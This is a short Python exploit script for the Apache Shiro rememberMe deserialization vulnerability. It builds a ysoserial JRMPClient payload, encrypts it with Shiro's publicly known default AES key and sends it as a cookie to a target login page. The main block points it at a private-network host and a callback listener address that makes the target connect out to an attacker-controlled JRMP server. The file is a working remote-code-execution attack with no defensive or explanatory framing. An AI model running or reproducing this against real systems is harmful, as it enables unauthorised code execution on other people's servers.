#coding: utf-8

import os
import re
import base64
import uuid
import subprocess
import requests
import sys
from Crypto.Cipher import AES

JAR_FILE = './ysoserial-2.jar'


def poc(url, rce_command):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        payload = generator(rce_command, JAR_FILE)  # 生成payload
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求
        print(r.text)
    except Exception as e:
        pass
    return False


def generator(command, fp):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    poc("http://10.10.10.244:8080/fgjxm/login_toLogin","192.168.10.30:1234")
